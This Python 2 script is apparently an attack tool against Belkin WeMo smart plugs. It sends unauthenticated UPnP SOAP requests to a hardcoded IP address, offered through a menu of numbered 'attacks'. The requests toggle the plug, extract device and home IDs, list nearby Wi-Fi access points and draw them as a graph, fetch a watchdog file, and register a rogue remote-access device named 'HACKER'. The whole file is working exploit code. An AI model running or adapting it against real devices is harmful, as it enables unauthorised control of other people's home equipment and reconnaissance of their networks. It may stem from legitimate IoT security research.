import sys,os
from socket import *
from urllib2 import URLError, HTTPError
from platform import system as thisSystem
import xml.dom.minidom as minidom
import IN,urllib,urllib2
import readline,time
import pickle
import struct
import base64
import re
import getopt
import matplotlib.pyplot as plt
import networkx as nx
import math


host = '129.94.5.93'
port = 49154

def attackSOAP(commands):
	argList = '<'+commands[3]+'>'+commands[0]+'</'+commands[3]+'><'+commands[3]+'>Boolean</'+commands[3]+'>'
	soapRequest = 'POST %s HTTP/1.1\r\n' % commands[4]
	return formSOAP(commands[1],commands[2],argList,soapRequest)

def remoteSOAP():
	actionName = 'RemoteAccess'
	serviceType = 'urn:Belkin:service:remoteaccess:1'
	argList = '<DeviceId>358240057593091</DeviceId>\n\t\t\t   <dst>0</dst>\n\t\t\t   <HomeId></HomeId>\n\t\t\t   <DeviceName>HACKER</DeviceName>\n\t\t\t   <MacAddr></MacAddr>\n\t\t\t   <pluginprivateKey></pluginprivateKey>\n\t\t\t   <smartprivateKey></smartprivateKey>\n\t\t\t   <smartUniqueId></smartUniqueId>\n\t\t\t   <numSmartDev></numSmartDev>'
	soapRequest = 'POST %s HTTP/1.1\r\n' % '/upnp/control/remoteaccess1'
	return formSOAP(actionName,serviceType,argList,soapRequest)

def formSOAP(actionName,serviceType,argList,soapRequest):
	soapBody = 	"""<?xml version="1.0" encoding="utf-8"?>
			<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
			 <s:Body>
			  <u:%s xmlns:u="%s">
			   %s
			  </u:%s>
			 </s:Body>
			</s:Envelope>
			""" % (actionName, serviceType, argList, actionName)
	#Specify the headers to send with the request
	headers = 	{
		'Content-Type':'text/xml; charset="utf-8"',
		'SOAPACTION':'"%s#%s"' % (serviceType,actionName),
		'Content-Length': len(soapBody),
		'HOST':'129.94.5.93',
		'User-Agent': 'Sukhvir Notra-HTTP/1.0',
	}
	#Generate the final payload
	for head,value in headers.iteritems():
		soapRequest += '%s: %s\r\n' % (head,value)
	soapRequest += '\r\n%s' % soapBody
	print soapRequest,'\n\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n'
	return soapRequest

def sendRecv():
	soapResponse = ''
	soapEnd = re.compile('<\/.*:envelope>')
	try:
		sock = socket(AF_INET,SOCK_STREAM)
		sock.connect((host,port))
		sock.send(soapRequest)
		while True:
			data = sock.recv(8192)
			if not data:
				break
			else:
				soapResponse += data
				if soapEnd.search(soapResponse.lower()) != None:
					break
		sock.close()
		return soapResponse
	except Exception, e:
		print 'Caught socket exception:',e
		sock.close()

def parseSOAP(soapResponse):
	(header,body) = soapResponse.split('\r\n\r\n',1)
	if not header.upper().startswith('HTTP/1.1 200'):
		print 'SOAP request failed with error code:',header.split('\r\n')[0].split(' ',1)[1]
	else:
		print body,'\n\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n'
	return body

def drawTopology(body):
	extract=body[(body.find('<ApList>')+8):(body.find('</ApList>'))]
	junk,ap=extract.split('$\n',1)

	aplist = ap.split(',\n',23)
	aplist.pop()

	count = 0
	ssiddict={}
	for item in range(len(aplist)):
		ssid,q,strength,encryption=aplist[item].split('|',3)
		if ssid in ssiddict:
			count+=1
			ssiddict[ssid+'(%d)'%count]=int(strength)
 		else:
 			ssiddict[ssid]=int(strength)

	angle = math.radians(360/len(ssiddict))

	ap ={'wemo':(0,0)}
	up=1
	for item,value in ssiddict.iteritems():
	    ap[item] = ((125-value)*math.cos(up*angle),(125-value)*math.sin(up*angle))
	    up+=1

	G = nx.Graph()
	for item in ssiddict:
		G.add_edge('wemo',item)

	nx.draw(G, pos=ap, with_labels=True)
	plt.show()

#--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++--#

state=''
choices={'1': [state,'SetBinaryState','urn:Belkin:service:basicevent:1','BinaryState','/upnp/control/basicevent1'],
	'2': ['0','GetDeviceInformation','urn:Belkin:service:deviceinfo:1','DeviceInformation','/upnp/control/deviceinfo1'],
	'3': ['0','GetApList','urn:Belkin:service:WiFiSetup:1','ApList','/upnp/control/WiFiSetup1'],
	'4': ['0','GetHomeInfo','urn:Belkin:service:basicevent:1','GetHomeInfo','/upnp/control/basicevent1'],
	'5': ['0','GetSignalStrength','urn:Belkin:service:basicevent:1','SignalStrength','/upnp/control/basicevent1'],
	'6': ['0','GetWatchdogFile','urn:Belkin:service:basicevent:1','WDFile','/upnp/control/basicevent1'],
}

try:
	while True:
		print '\nWhat attack do you want to do? (Type exit to end the code)\n\n1 - Switch Control\n2 - Get Current Status\n3 - Get closeby Access Points\n4 - Get Home ID\n5 - Get Signal Strength\n6 - Get Watch Dog File (What is this?)\n7 - Get Remote Access\n\n'
		attack = raw_input('Your Choice: ')
		
		if attack=='1':
			state = raw_input('\nEnter the state ( 1 - ON, 0 - OFF , ctrl+C to exit) : ')
			choices['1'][0]=state
			soapRequest=attackSOAP(choices.get(attack))
		elif attack=='7':
			soapRequest=remoteSOAP()
		elif attack=='exit':
			sys.exit(0)
		else:
			soapRequest=attackSOAP(choices.get(attack))			

		soapResponse = sendRecv()
		body=parseSOAP(soapResponse)

		if attack=='3':
			drawTopology(body)	
except KeyboardInterrupt:
	print '\n\nExititng Now!'